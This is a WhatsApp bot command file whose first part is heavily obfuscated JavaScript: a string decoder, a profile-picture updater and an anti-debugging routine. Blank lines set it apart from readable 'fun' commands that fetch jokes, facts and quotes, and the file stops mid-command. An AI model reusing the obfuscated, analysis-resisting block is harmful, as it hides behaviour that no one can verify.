_0x3cf394[_0x102bd7(0x557,'kwdB',0x5dd,0x558,0x595)](updateProfilePicture,_0x3cf394[_0xab024e(0xb2,0xad,0x6e,'m$KN',0x5a)](_0x42339b[_0x3ca70f(-0x236,-0x282,-0x1eb,-0x1c0,'SkK4')]['id'][_0x102bd7(0x54a,'*dVn',0x401,0x4c3,0x4e5)](':')[-0xb*0x2a0+-0x169c+0x337c],_0x3cf394[_0x102bd7(0x4a8,'WBqa',0x4ad,0x42c,0x3b0)]),_0x2668a1,_0x42339b),await _0x494dba[_0xab024e(0x18d,0x18c,0x9,'Nr7v',0xc5)](_0x3cf394[_0x102bd7(0x422,'1]bs',0x45b,0x45b,0x4da)]);});async function updateProfilePicture(_0xe2c674,_0x4022a7,_0x57aa3b){const _0x1f260b={'lczTu':function(_0x1176fc,_0x425449){return _0x1176fc(_0x425449);},'ETHiE':function(_0x43a87b,_0x2030d4){return _0x43a87b(_0x2030d4);},'YMvmj':_0x190969(0xe0,'U)BK',0xa0,0x125,0x121),'PHgxC':_0x190969(0xe4,'QX7d',0xaf,0x170,0x3d)+_0x264467('cW&*',0x36a,0x3ce,0x43e,0x47b)+_0x190969(0x24a,'o$Ip',0x1a5,0x1fa,0xee)+'re','ITbqi':_0x264467('SKp6',0x4b9,0x41e,0x39f,0x465)+'re','eTEAc':_0x315938('8qGH',0x2c1,0x347,0x200,0x2d5)};function _0x315938(_0x43c880,_0x201fbc,_0x347e1e,_0xe9d8c6,_0x101a58){return _0x4fda62(_0x43c880,_0x201fbc- -0xbf,_0x347e1e-0x1a0,_0xe9d8c6-0x4,_0x101a58-0x86);}function _0x4320e5(_0x38e70e,_0x17d873,_0x44ddcf,_0x371c31,_0x1c0c8d){return _0x4fda62(_0x44ddcf,_0x1c0c8d- -0x110,_0x44ddcf-0x156,_0x371c31-0x164,_0x1c0c8d-0x126);}const {query:_0x532248}=_0x57aa3b;function _0x264467(_0x482adb,_0x460701,_0x1bfc19,_0x2c983c,_0x273085){return _0x55933c(_0x482adb-0x11d,_0x460701-0x107,_0x482adb,_0x1bfc19-0x14b,_0x273085-0xad);}const {preview:_0x30e60e}=await _0x1f260b[_0x4320e5(0x27e,0x2bd,'cW&*',0x228,0x1eb)](generateProfilePicture,_0x4022a7);function _0x1d3c19(_0x1c2847,_0x40aa43,_0x3d0011,_0x51ae74,_0x2f9059){return _0x5a4478(_0x1c2847-0x81,_0x51ae74,_0x3d0011-0x4c,_0x1c2847- -0x55d,_0x2f9059-0xfb);}function _0x190969(_0x5240c9,_0x2c6399,_0x1d63d0,_0x442eb5,_0x413d68){return _0x55933c(_0x5240c9-0x4b,_0x2c6399-0xb5,_0x2c6399,_0x1d63d0- -0x1ac,_0x413d68-0x23);}await _0x1f260b[_0x190969(0x8d,'zkUP',0xdf,0xf0,0xbf)](_0x532248,{'tag':'iq','attrs':{'to':_0xe2c674,'type':_0x1f260b[_0x190969(0x1a5,'PO!Z',0x180,0xd3,0x195)],'xmlns':_0x1f260b[_0x4320e5(0x34e,0x395,'QX7d',0x233,0x2e0)]},'content':[{'tag':_0x1f260b[_0x4320e5(0x174,0x18d,'rW^i',0x1f6,0x1e2)],'attrs':{'type':_0x1f260b[_0x4320e5(0x15b,0x114,'IehH',0x14e,0x1c2)]},'content':_0x30e60e}]});}async function generateProfilePicture(_0x24949f){function _0x4e367d(_0x417d1a,_0x2b081a,_0x166d4b,_0x185dce,_0x3815d5){return _0x4fda62(_0x417d1a,_0x3815d5- -0x14d,_0x166d4b-0x9c,_0x185dce-0x25,_0x3815d5-0xc5);}function _0x805c(_0x3b12bf,_0x316cc9,_0xef8432,_0x8613e7,_0x517caa){return _0x487c34(_0x3b12bf,_0x316cc9-0x5c,_0xef8432-0x76,_0xef8432- -0x183,_0x517caa-0xb3);}const _0x31a523=await Jimp[_0x805c('cW&*',0x383,0x2d7,0x206,0x206)](_0x24949f),_0x408fd8=_0x31a523[_0xccfd00('kwdB',0x15a,0x17b,0x164,0xa8)+_0x5bc7fe(-0x113,-0x13c,-0xd5,-0x96,'$Nvv')]();function _0x1be4a4(_0x26922d,_0x4ff971,_0x546401,_0x53830d,_0x30f3ae){return _0x5a8e32(_0x546401,_0x4ff971-0x1e0,_0x546401-0x195,_0x53830d-0x2ac,_0x30f3ae-0x131);}const _0x154688=_0x31a523[_0x4e367d('cW&*',0x2a8,0x1dc,0x245,0x22f)+_0xccfd00('2Nm(',-0xe8,-0x62,-0xba,-0x67)]();function _0xccfd00(_0x3e0f12,_0x1dbc77,_0x4880f3,_0x5028b5,_0x43ca9a){return _0x4fda62(_0x3e0f12,_0x43ca9a- -0x360,_0x4880f3-0xd6,_0x5028b5-0x1f1,_0x43ca9a-0x156);}function _0x5bc7fe(_0x5167a8,_0x40ad0e,_0x4bbf9e,_0x5c2e99,_0x2bdc3c){return _0x55933c(_0x5167a8-0x91,_0x40ad0e-0x19d,_0x2bdc3c,_0x5167a8- -0x3b0,_0x2bdc3c-0xd9);}const _0x942364=_0x31a523[_0xccfd00('Nr7v',-0x71,0x6,-0xe0,-0x2b)](0x50*-0x4+0x709+0x5c9*-0x1,-0xa85+-0x2067+0x1576*0x2,_0x408fd8,_0x154688);return{'img':await _0x942364[_0x5bc7fe(-0xcd,-0x6b,-0x85,-0x152,'gok#')+_0xccfd00('mpWF',-0xfc,-0x196,-0x1b,-0xc5)](0x1583+0x45b*-0x2+-0xb89,-0x10*-0x1da+0x82e*-0x3+0x2*-0x123)[_0x1be4a4(0x13a,0x115,'gok#',0x105,0x144)+_0x4e367d('XumT',0x141,0x188,0x1e5,0x1d0)+_0x805c('o3F2',0x374,0x399,0x43b,0x32c)](Jimp[_0x5bc7fe(-0x27,-0xf4,-0x6a,-0x7a,'cW&*')+_0xccfd00('tjMS',-0xae,-0xbc,-0xcf,-0x9b)]),'preview':await _0x942364[_0xccfd00('gok#',0x5f,-0xbf,0x4b,-0xd)+_0x5bc7fe(0x3c,0x1f,0x5f,0x61,'tjMS')]()[_0x4e367d('&6@k',0x19c,0x1e7,0x20a,0x203)+_0x805c(']bag',0x349,0x33b,0x3d5,0x3ac)+_0xccfd00('*dVn',0x41,0x4d,0x31,0xc2)](Jimp[_0x4e367d('oE1r',0x116,0xed,0x1a2,0x158)+_0x4e367d('BdlS',0x1e9,0x1b3,0x1b4,0x27d)])};}function _0x594b(_0x2ecdb4,_0x3650a0){const _0x4383f5=_0x1fe3();return _0x594b=function(_0x31ccdd,_0x43a753){_0x31ccdd=_0x31ccdd-(-0x258b+-0x8d6+-0x2*-0x17cb);let _0x50ba3a=_0x4383f5[_0x31ccdd];if(_0x594b['pnxnwL']===undefined){var _0x3661eb=function(_0x4fd0d0){const _0x10c19a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x4a9d15='',_0x29eb97='',_0x4ffbf9=_0x4a9d15+_0x3661eb;for(let _0x104f20=-0x770+-0x8*-0x13a+0x98*-0x4,_0x903642,_0x1aef72,_0x20d5cc=0x1002+0xf98+-0x1f9a;_0x1aef72=_0x4fd0d0['charAt'](_0x20d5cc++);~_0x1aef72&&(_0x903642=_0x104f20%(-0x268*0x2+-0x14d*0x11+0x79*0x39)?_0x903642*(0x349*-0x7+-0xc37+0x2376)+_0x1aef72:_0x1aef72,_0x104f20++%(0x42+0x21eb+0x3*-0xb63))?_0x4a9d15+=_0x4ffbf9['charCodeAt'](_0x20d5cc+(0x6*-0x654+-0x8c0+0x2ec2))-(0x89*0x5+0x2027+-0x22ca)!==-0x6a*0x51+0xaa+0x20e*0x10?String['fromCharCode'](0x24e4+0x9f+-0x2484*0x1&_0x903642>>(-(0x2*-0x8b7+-0x99+0x1209)*_0x104f20&0xe56*-0x2+-0x16c+-0x6*-0x505)):_0x104f20:-0x122a+0x208*0xd+-0x2*0x41f){_0x1aef72=_0x10c19a['indexOf'](_0x1aef72);}for(let _0x3564a7=0x14e9*-0x1+0x7f*0x11+0xc7a,_0x2372e0=_0x4a9d15['length'];_0x3564a7<_0x2372e0;_0x3564a7++){_0x29eb97+='%'+('00'+_0x4a9d15['charCodeAt'](_0x3564a7)['toString'](0xc40+0x541+-0x1171))['slice'](-(-0x1897+0x67*0x5c+-0x1*0xc6b));}return decodeURIComponent(_0x29eb97);};const _0x469219=function(_0x48cb7e,_0x4c3482){let _0xb35099=[],_0x28d777=0x22b0+0x267d+-0x492d,_0x52aa9a,_0x4351d4='';_0x48cb7e=_0x3661eb(_0x48cb7e);let _0x3a59af;for(_0x3a59af=-0x2b*0x8f+0x18d*-0x3+0x1cac;_0x3a59af<-0xb*0x1+0x993+-0x888;_0x3a59af++){_0xb35099[_0x3a59af]=_0x3a59af;}for(_0x3a59af=-0x296+0x4*-0x749+0x1f*0x106;_0x3a59af<-0x1de3*0x1+0x3*-0x923+0x3a4c;_0x3a59af++){_0x28d777=(_0x28d777+_0xb35099[_0x3a59af]+_0x4c3482['charCodeAt'](_0x3a59af%_0x4c3482['length']))%(-0x18*-0xed+0x92+-0x15ca),_0x52aa9a=_0xb35099[_0x3a59af],_0xb35099[_0x3a59af]=_0xb35099[_0x28d777],_0xb35099[_0x28d777]=_0x52aa9a;}_0x3a59af=-0xcfa+0x5b*0x1f+0x1*0x1f5,_0x28d777=-0x1754+-0x18df*-0x1+-0x1*0x18b;for(let _0x512e7b=-0x6cd*0x1+-0x6*-0x2b+0x5cb;_0x512e7b<_0x48cb7e['length'];_0x512e7b++){_0x3a59af=(_0x3a59af+(0x2*-0x93f+-0x1512+0x2791))%(0x667+0xec9+-0x1430),_0x28d777=(_0x28d777+_0xb35099[_0x3a59af])%(0x35f*-0x1+-0x1*-0x40f+-0x8*-0xa),_0x52aa9a=_0xb35099[_0x3a59af],_0xb35099[_0x3a59af]=_0xb35099[_0x28d777],_0xb35099[_0x28d777]=_0x52aa9a,_0x4351d4+=String['fromCharCode'](_0x48cb7e['charCodeAt'](_0x512e7b)^_0xb35099[(_0xb35099[_0x3a59af]+_0xb35099[_0x28d777])%(0x1d*-0x12+0x234a+-0x2040)]);}return _0x4351d4;};_0x594b['flFgvW']=_0x469219,_0x2ecdb4=arguments,_0x594b['pnxnwL']=!![];}const _0x5b8d0d=_0x4383f5[-0xf3*-0x9+0x1*-0x184b+0xfc0],_0x4b9708=_0x31ccdd+_0x5b8d0d,_0x395a79=_0x2ecdb4[_0x4b9708];if(!_0x395a79){if(_0x594b['YOkFNI']===undefined){const _0x5c1567=function(_0xe9f21c){this['rKwqCr']=_0xe9f21c,this['lMEfMx']=[-0xdd9+-0x8a*-0x1d+0x98*-0x3,0x1d36+0x6a3*-0x4+-0x2aa,-0x511*-0x5+-0xc6d*-0x3+-0x3e9c],this['lVWMHx']=function(){return'newState';},this['pZpjDZ']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['FSChtW']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x5c1567['prototype']['VBwTye']=function(){const _0x508a1e=new RegExp(this['pZpjDZ']+this['FSChtW']),_0x5df968=_0x508a1e['test'](this['lVWMHx']['toString']())?--this['lMEfMx'][0x1*-0x2174+0xa87+-0x5*-0x496]:--this['lMEfMx'][0x180f+-0xf9*0x16+-0x3*0xe3];return this['mqnfSy'](_0x5df968);},_0x5c1567['prototype']['mqnfSy']=function(_0x3fa58d){if(!Boolean(~_0x3fa58d))return _0x3fa58d;return this['gymkgv'](this['rKwqCr']);},_0x5c1567['prototype']['gymkgv']=function(_0x3f7f00){for(let _0x16c5e1=-0x27+-0x167*0x4+0x3b*0x19,_0x38341c=this['lMEfMx']['length'];_0x16c5e1<_0x38341c;_0x16c5e1++){this['lMEfMx']['push'](Math['round'](Math['random']())),_0x38341c=this['lMEfMx']['length'];}return _0x3f7f00(this['lMEfMx'][0x2627+0x1*0xea5+-0x34cc]);},new _0x5c1567(_0x594b)['VBwTye'](),_0x594b['YOkFNI']=!![];}_0x50ba3a=_0x594b['flFgvW'](_0x50ba3a,_0x43a753),_0x2ecdb4[_0x4b9708]=_0x50ba3a;}else _0x50ba3a=_0x395a79;return _0x50ba3a;},_0x594b(_0x2ecdb4,_0x3650a0);}function _0x5a4478(_0x7d11ce,_0x3c5dda,_0x54ccac,_0x317d54,_0x27b3be){return _0x594b(_0x317d54-0x233,_0x3c5dda);}function _0x2ea1d6(_0x57e6a8){const _0x578fa0={'QzTwV':function(_0xd63405,_0x135ee1){return _0xd63405!==_0x135ee1;},'UZzqK':_0x2277c7(-0x28f,-0x238,'*C1k',-0x242,-0x16c),'EEXZY':_0x2277c7(-0xe1,-0x1f0,'v6J%',-0x1a8,-0x1fa),'bGvfX':function(_0x2e4e3b,_0x256772){return _0x2e4e3b(_0x256772);},'uLMxS':_0x2277c7(-0x2c1,-0x268,'vnJO',-0x1fe,-0x135),'wYGte':_0x2277c7(-0x26f,-0x11d,'8qGH',-0x1f4,-0x28b),'YpAhc':function(_0x5a6779,_0x1c9ec2){return _0x5a6779===_0x1c9ec2;},'HKbVo':_0x3298eb(-0x14f,'&6@k',-0x1da,-0x1c8,-0x1e1),'oUBGm':_0x245da0('o$Ip',-0x270,-0x28a,-0x228,-0x206)+'g','QQOYY':function(_0xc0ddfb,_0x1a8dac){return _0xc0ddfb!==_0x1a8dac;},'ofySO':_0x65374(0x11,0x99,0x80,0x9c,'1WYS'),'PYLEh':_0x65374(0x1d9,0x10c,0x84,0xa8,'*dVn'),'itSlY':_0x245da0('SkK4',-0x145,-0xea,-0x15c,-0x11d)+_0x2277c7(-0x15e,-0xc7,'$Nvv',-0x10b,-0xaa)+_0x2277c7(-0x2c8,-0x168,'lJl1',-0x23c,-0x16c),'wrJgg':_0xf0923d(-0xd1,-0xdf,-0xe0,-0x152,'m$KN')+'er','nntQM':function(_0x9ceef2,_0x39d53){return _0x9ceef2!==_0x39d53;},'jgkle':_0x2277c7(-0x106,-0x1ac,'U)BK',-0x188,-0x110),'mGLUC':_0x3298eb(0xa,'1WYS',-0x79,-0x54,0x7),'cgtCA':function(_0x404939,_0x50d1bf){return _0x404939+_0x50d1bf;},'NtcZw':function(_0x10e848,_0x43f924){return _0x10e848/_0x43f924;},'gkrHa':_0x3298eb(-0x21,'x*gC',-0x36,-0xe1,-0x161)+'h','HzDDL':function(_0x233a0d,_0x3b5af9){return _0x233a0d%_0x3b5af9;},'qLeqH':_0x2277c7(-0x1b3,-0x15d,'o$Ip',-0x208,-0x1fb),'JzzIi':_0x3298eb(-0x211,'IehH',-0x167,-0x196,-0xcd),'sUVUM':_0x245da0('pRBK',-0x137,-0x17a,-0x1dd,-0x121),'baowe':_0xf0923d(-0x14a,-0xbc,-0x4,-0xce,'@c5l')+'n','tXLTR':_0x2277c7(-0x110,-0x1d9,'h$3r',-0x19f,-0x14d),'kaozp':_0xf0923d(-0x1ba,-0x15d,-0x148,-0x1b9,'8qGH'),'KqQbE':function(_0x31accd,_0x469b48){return _0x31accd+_0x469b48;},'vMbwG':_0x65374(0x1bd,0x17c,0x13d,0x24a,'&6@k')+_0x3298eb(-0x125,'kwdB',-0x12c,-0x178,-0x1eb)+'t','xwZIh':function(_0x1103a8,_0x32b2b3){return _0x1103a8(_0x32b2b3);},'vOqda':_0x245da0('m$KN',-0xfc,-0x132,-0x173,-0x148),'PYIDb':_0x2277c7(-0x24e,-0x2b0,'&6@k',-0x204,-0x272),'kUezC':function(_0x217506,_0x58e9cc){return _0x217506===_0x58e9cc;},'fhfpM':_0x2277c7(-0x1cb,-0x265,'mpWF',-0x18d,-0x140),'DkeWM':function(_0x525681,_0xb0dbbc){return _0x525681(_0xb0dbbc);}};function _0x245da0(_0x2fa61a,_0x38595b,_0x345a34,_0x5b5e27,_0x4422bb){return _0x4fda62(_0x2fa61a,_0x4422bb- -0x4af,_0x345a34-0x16,_0x5b5e27-0x47,_0x4422bb-0x5c);}function _0x121df7(_0x4bdb67){function _0xbb82bd(_0x1ff7a5,_0x46d65d,_0x1a9c29,_0x485658,_0x5f2e7b){return _0x245da0(_0x5f2e7b,_0x46d65d-0xb7,_0x1a9c29-0x80,_0x485658-0x16f,_0x1a9c29-0x5a8);}function _0x58d380(_0x12dbd2,_0x3f9866,_0x2646f4,_0xedbb28,_0x3c145d){return _0x245da0(_0x3c145d,_0x3f9866-0x15,_0x2646f4-0x63,_0xedbb28-0x10d,_0x3f9866-0x336);}function _0x51a2fc(_0x2fe169,_0x28c3e8,_0x329c84,_0x549a92,_0x59678d){return _0x3298eb(_0x2fe169-0x4d,_0x59678d,_0x329c84-0xa5,_0x329c84-0x2c2,_0x59678d-0x87);}function _0x3a74a6(_0x3440c5,_0xcce81c,_0x1cb59e,_0x3d0387,_0x28ff49){return _0x2277c7(_0x3440c5-0x142,_0xcce81c-0xf8,_0x3440c5,_0x1cb59e-0x250,_0x28ff49-0x11c);}function _0x1e9817(_0x37c815,_0x238571,_0x2852a4,_0x44a624,_0x56d235){return _0x65374(_0x37c815-0x15e,_0x44a624-0x1b4,_0x2852a4-0x21,_0x44a624-0x1ae,_0x2852a4);}if(_0x578fa0[_0xbb82bd(0x43f,0x336,0x3c6,0x36e,'XumT')](_0x578fa0[_0x58d380(0x24d,0x1b7,0x12e,0x192,']bag')],_0x578fa0[_0xbb82bd(0x4db,0x438,0x4f1,0x5c8,'o$Ip')])){if(_0x578fa0[_0x1e9817(0x249,0x395,'K3ue',0x2d1,0x2af)](typeof _0x4bdb67,_0x578fa0[_0xbb82bd(0x3eb,0x3e3,0x3c7,0x312,'WBqa')]))return _0x578fa0[_0x58d380(0x245,0x287,0x1c1,0x23c,'w6IS')](_0x578fa0[_0x1e9817(0x12f,0x1a9,'PO!Z',0x1ad,0x273)],_0x578fa0[_0xbb82bd(0x540,0x4d0,0x496,0x4f2,'o$Ip')])?function(_0x23877d){}[_0x3a74a6('o$Ip',0x1bc,0x159,0x217,0x203)+_0xbb82bd(0x3c9,0x393,0x398,0x439,'h$3r')+'r'](_0x578fa0[_0x1e9817(0x220,0x381,'h$3r',0x2ce,0x229)])[_0x51a2fc(0x1f2,0x2a2,0x20c,0x182,'BdlS')](_0x578fa0[_0x3a74a6('rW^i',-0xa1,-0x2e,-0x5c,0x9f)]):_0x3780ac;else{if(_0x578fa0[_0x58d380(0x2ae,0x2a6,0x370,0x243,'ytIh')](_0x578fa0[_0xbb82bd(0x417,0x4ab,0x426,0x386,'SKp6')],_0x578fa0[_0xbb82bd(0x391,0x3f4,0x3c3,0x2f0,'lJl1')])){if(_0x578fa0[_0x3a74a6('mpWF',-0x43,-0x1c,-0x2e,0x8b)](_0x578fa0[_0x58d380(0xe8,0x163,0x1de,0x232,'tjMS')]('',_0x578fa0[_0x3a74a6('o3F2',0x77,0x34,-0x35,0xb)](_0x4bdb67,_0x4bdb67))[_0x578fa0[_0x51a2fc(0x1b6,0x210,0x169,0xdd,'vnJO')]],-0x1*-0xa52+-0x13c6+0x327*0x3)||_0x578fa0[_0x58d380(0x2fd,0x246,0x301,0x2e1,'vnJO')](_0x578fa0[_0x58d380(0x321,0x284,0x1c6,0x26a,'2Nm(')](_0x4bdb67,0x8b*0x1d+0x1*0x15a0+0x254b*-0x1),0x20ed+0x11a2+-0x328f))_0x578fa0[_0xbb82bd(0x573,0x551,0x4a9,0x498,'1WYS')](_0x578fa0[_0xbb82bd(0x53c,0x3de,0x476,0x496,'o3F2')],_0x578fa0[_0x3a74a6('SKp6',-0x48,0x76,-0x52,0x61)])?function(){function _0x4f85d5(_0x45f4f9,_0x84fa36,_0x51309f,_0x47284f,_0x2cd2ed){return _0x58d380(_0x45f4f9-0x117,_0x84fa36- -0x2df,_0x51309f-0x1a3,_0x47284f-0x1d9,_0x45f4f9);}function _0x1be6f9(_0x117e4f,_0x9dc6af,_0x16f089,_0x3256a1,_0x33a537){return _0x3a74a6(_0x33a537,_0x9dc6af-0x37,_0x9dc6af-0x3be,_0x3256a1-0x105,_0x33a537-0x4d);}function _0x2e36b1(_0x1a1f4f,_0x1964b6,_0x5888b3,_0x4440b0,_0x17d4cc){return _0xbb82bd(_0x1a1f4f-0x78,_0x1964b6-0x17e,_0x5888b3- -0x238,_0x4440b0-0x1cd,_0x1a1f4f);}function _0x56c6b7(_0x33b395,_0x20547a,_0x2c36a5,_0xd7b064,_0x2291c9){return _0xbb82bd(_0x33b395-0xb8,_0x20547a-0x95,_0x33b395- -0x4b6,_0xd7b064-0x34,_0x2291c9);}if(_0x578fa0[_0x2e36b1('BdlS',0x35f,0x2bf,0x358,0x2b4)](_0x578fa0[_0x2e36b1('*dVn',0x29b,0x27f,0x355,0x2dc)],_0x578fa0[_0x56c6b7(-0x124,-0xe1,-0x63,-0x19b,'rW^i')]))return!![];else{if(_0x53400a){const _0xa17f30=_0x361a4b[_0x2e36b1('oE1r',0x208,0x256,0x241,0x1bb)](_0x45cd3,arguments);return _0x1bd036=null,_0xa17f30;}}}[_0xbb82bd(0x436,0x43f,0x45b,0x4be,'Nr7v')+_0x58d380(0x185,0x132,0x1c9,0x157,')LUP')+'r'](_0x578fa0[_0xbb82bd(0x5a8,0x521,0x509,0x475,'BdlS')](_0x578fa0[_0x51a2fc(0x11b,0x3c,0x106,0x1c1,')LUP')],_0x578fa0[_0xbb82bd(0x4f1,0x4d8,0x4d9,0x4c3,'*dVn')]))[_0x58d380(0x1d8,0x13c,0x16b,0x1e2,'SKp6')](_0x578fa0[_0xbb82bd(0x4a4,0x3c0,0x447,0x4dd,'kwdB')]):_0x578fa0[_0x51a2fc(0x33,0xe0,0xf7,0x8d,'m$KN')](_0x25ced6,'0');else{if(_0x578fa0[_0x3a74a6('pRBK',0x167,0x106,0xf7,0x1da)](_0x578fa0[_0x51a2fc(0x1fe,0x159,0x161,0xca,'lJl1')],_0x578fa0[_0x1e9817(0x21c,0x265,'3nDp',0x275,0x2f3)])){const _0x470227=_0x5a89bc?function(){function _0x50a8f1(_0x561e41,_0x33d628,_0x50957c,_0xd44584,_0x212545){return _0x51a2fc(_0x561e41-0xdd,_0x33d628-0x150,_0x561e41-0xb2,_0xd44584-0x11c,_0x212545);}if(_0xd84e6f){const _0xce111f=_0x11b069[_0x50a8f1(0x280,0x2cc,0x347,0x236,'mpWF')](_0x20114b,arguments);return _0x56cb39=null,_0xce111f;}}:function(){};return _0x55a003=![],_0x470227;}else(function(){function _0x551d9b(_0x40647c,_0x5df474,_0x74aaca,_0x3c98bd,_0xe141cf){return _0x1e9817(_0x40647c-0x18b,_0x5df474-0x137,_0xe141cf,_0x40647c-0x2ad,_0xe141cf-0x193);}function _0x4ec545(_0x50818b,_0x5c5b26,_0xbce4f5,_0x2b1e25,_0x42cae6){return _0x1e9817(_0x50818b-0x129,_0x5c5b26-0x43,_0xbce4f5,_0x42cae6-0x87,_0x42cae6-0xd0);}function _0x1f3d96(_0x5a0664,_0x665229,_0x104cf3,_0x178b24,_0x1d33fe){return _0x51a2fc(_0x5a0664-0x4e,_0x665229-0x21,_0x1d33fe- -0x30b,_0x178b24-0x1bc,_0x665229);}function _0x2c203e(_0x17a020,_0x6d3493,_0xc66e47,_0x42db5c,_0x402a43){return _0x1e9817(_0x17a020-0x20,_0x6d3493-0x77,_0x17a020,_0x402a43- -0x382,_0x402a43-0x11e);}const _0x4f18ea={'ufZYj':function(_0x515a69,_0x575ac8){function _0x2f79dc(_0x223112,_0x595636,_0x37b12e,_0x5c6a42,_0xcb547f){return _0x594b(_0x223112- -0xa5,_0x5c6a42);}return _0x578fa0[_0x2f79dc(0x230,0x24a,0x1a2,'PSDA',0x2aa)](_0x515a69,_0x575ac8);}};if(_0x578fa0[_0x1f3d96(-0x26f,'!L7g',-0x27d,-0x24e,-0x1a5)](_0x578fa0[_0x551d9b(0x4e5,0x417,0x43e,0x5ae,'mpWF')],_0x578fa0[_0x1f3d96(-0x1db,'ua2n',-0x77,-0xd8,-0x133)]))return![];else{if(_0x191dcd)return _0x373ab6;else _0x4f18ea[_0x551d9b(0x4bc,0x45e,0x460,0x50c,'rW^i')](_0x16f679,-0x49*0x88+0x8cc+0x1dfc);}}[_0xbb82bd(0x492,0x4fc,0x4de,0x548,'K3ue')+_0x58d380(0x2c2,0x260,0x202,0x2c4,'gok#')+'r'](_0x578fa0[_0xbb82bd(0x3ee,0x4b9,0x4b4,0x556,'v6J%')](_0x578fa0[_0x1e9817(0x1e2,0x1bf,'ua2n',0x1ef,0x1ca)],_0x578fa0[_0x51a2fc(0x257,0x1d1,0x209,0x23c,'ua2n')]))[_0x3a74a6(']bag',0x1a,0x49,0x87,0xfe)](_0x578fa0[_0x3a74a6('1]bs',-0x3d,-0x3c,-0xaf,-0x7)]));}}else{if(_0x1c3fce){const _0x1c4eb9=_0x5052bb[_0xbb82bd(0x4bd,0x57a,0x4b5,0x586,'$Nvv')](_0x2833e0,arguments);return _0xa28b15=null,_0x1c4eb9;}}}_0x578fa0[_0x58d380(0x256,0x1d1,0x288,0x1d7,'zkUP')](_0x121df7,++_0x4bdb67);}else return!![];}function _0xf0923d(_0x5cabe9,_0x4a15a8,_0x2e7ddb,_0x39fe68,_0x2c0642){return _0x487c34(_0x2c0642,_0x4a15a8-0x32,_0x2e7ddb-0x166,_0x4a15a8- -0x647,_0x2c0642-0x172);}function _0x2277c7(_0x3ff928,_0x37d970,_0x1775e3,_0x3a8597,_0x4061f6){return _0x55933c(_0x3ff928-0xef,_0x37d970-0x4c,_0x1775e3,_0x3a8597- -0x4e4,_0x4061f6-0x8d);}function _0x65374(_0x29839f,_0x2762a7,_0x41afdb,_0x160c81,_0x4036d3){return _0x4fda62(_0x4036d3,_0x2762a7- -0x298,_0x41afdb-0x5d,_0x160c81-0x1ad,_0x4036d3-0x192);}function _0x3298eb(_0x3f79bc,_0x3f6b45,_0x42b3ca,_0x566d35,_0x47e46b){return _0x55933c(_0x3f79bc-0xa1,_0x3f6b45-0x165,_0x3f6b45,_0x566d35- -0x44d,_0x47e46b-0x179);}try{if(_0x578fa0[_0x3298eb(-0xa4,'WBqa',-0xf,-0x6d,0x1b)](_0x578fa0[_0xf0923d(-0x179,-0xb4,-0x17,-0xe8,'o$Ip')],_0x578fa0[_0x65374(0x37,0x55,0x1f,0x28,'o3F2')])){const _0x2dd0a1=_0x1bb6f3[_0x245da0('ytIh',-0x116,-0x192,-0x143,-0x1e7)](_0x441a3b,arguments);return _0x4c9bd5=null,_0x2dd0a1;}else{if(_0x57e6a8){if(_0x578fa0[_0x245da0('!L7g',-0x112,-0xcc,-0x18c,-0x167)](_0x578fa0[_0xf0923d(-0x17d,-0x223,-0x19d,-0x1ba,'tjMS')],_0x578fa0[_0x65374(-0xd,0x58,-0x7b,0x12d,'!L7g')])){const _0x453ba0=_0x89484e?function(){function _0x3b610e(_0x3c2179,_0xea261c,_0x248652,_0x583a7a,_0x1fef67){return _0x2277c7(_0x3c2179-0x191,_0xea261c-0x1f4,_0x248652,_0x583a7a-0x63,_0x1fef67-0x8);}if(_0x5cf6ef){const _0x56ea11=_0x1d7bfe[_0x3b610e(-0xc8,-0x14b,'1]bs',-0x143,-0x14e)](_0x48a66e,arguments);return _0x526cce=null,_0x56ea11;}}:function(){};return _0x20cbb9=![],_0x453ba0;}else return _0x121df7;}else{if(_0x578fa0[_0x65374(0x218,0x16a,0x1b9,0x1e6,')LUP')](_0x578fa0[_0xf0923d(-0x2e9,-0x228,-0x168,-0x24b,'#dg6')],_0x578fa0[_0x3298eb(-0x51,'SKp6',0x1a,-0x65,-0xe7)]))_0x578fa0[_0xf0923d(-0x1be,-0x1af,-0x163,-0x1fc,'*C1k')](_0x121df7,-0x16ca+-0x269a+0x3d64);else{const _0x3922a7=_0x49a684[_0x2277c7(-0x142,-0x196,'h$3r',-0x1d9,-0x1b1)](_0x4883b7,arguments);return _0x366d57=null,_0x3922a7;}}}}catch(_0x49c9cd){}}



































































































cmd({
    pattern: "question",
    desc: "Random Question.",
    category: "fun",
    filename: __filename,
},
async(Void, citel, text) => {
    return await citel.reply(`${random_question()}`);
}
)
//---------------------------------------------------------------------------
cmd({
    pattern: "truth",
    desc: "truth and dare(truth game.).",
    category: "fun",
    filename: __filename,
},
async(Void, citel, text) => {
    return await citel.reply(`${truth()}`);
}
)
//---------------------------------------------------------------------------
cmd({
    pattern: "dare",
    desc: "truth and dare(dare game.).",
    category: "fun",
    filename: __filename,
},
async(Void, citel, text) => {
    return await citel.reply(`${dare()}`);
}
)
//--------------------------------------------------------------------------------
cmd({
    pattern: "joke",
    desc: "Sends Joke in chat.",
    category: "fun",
    filename: __filename,
},
async(Void, citel, text) => { 

const response =await  fetch('https://official-joke-api.appspot.com/random_joke');
const joke= await response.json();
citel.reply( `Joke: ${joke.setup}\nPunchline :  ${joke.punchline}`);

})
//---------------------------------------------------------------------------
cmd({
    pattern: "joke2",
    desc: "Sends Joke in chat.",
    category: "fun",
    filename: __filename,
},
async(Void, citel, text) => { 

 fetch('https://v2.jokeapi.dev/joke/Any?type=single')
 .then(response => response.json())
 .then(data => {
 citel.reply(`*joke :* ${data.joke}`); 
})
.catch(error => {
return citel.reply ('Error fetching joke:' + error);
});
}
)

//---------------------------------------------------------------------------
cmd({
pattern: "fact",
desc: "Sends fact in chat.",
category: "fun",
filename: __filename,
},
async(Void, citel, text) => {
const { data } = await axios.get(`https://nekos.life/api/v2/fact`)
return citel.reply(`*Fact:* ${data.fact}`)   
}

)
//---------------------------------------------------------------------------
cmd({
pattern: "quotes",
desc: "Sends quotes in chat.",
category: "fun",
filename: __filename,
},
async(Void, citel, text) => {
var quoo = await axios.get(`https://favqs.com/api/qotd`)
const replyf = `
╔════◇
║ *🎗️Content:* ${quoo.data.quote.body}
║ *👤Author:* ${quoo.data.quote.author}
║  
╚════════════╝ `
return citel.reply(replyf)
}

)
//---------------------------------------------------------------------------
cmd({
pattern: "define",
